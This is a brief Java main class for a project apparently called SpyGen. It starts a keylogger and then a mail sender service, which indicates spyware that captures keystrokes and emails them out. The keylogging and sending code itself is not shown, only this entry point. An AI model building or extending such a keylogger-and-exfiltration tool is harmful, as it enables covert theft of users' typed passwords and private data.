package com.houarizegai.spygen;

import com.houarizegai.spygen.keylogger.Keylogger;
import com.houarizegai.spygen.mail.SenderService;

public class SpyGen {
    public static void main(String[] args) {
        Keylogger.startKeylogger();
        new SenderService();
    }
}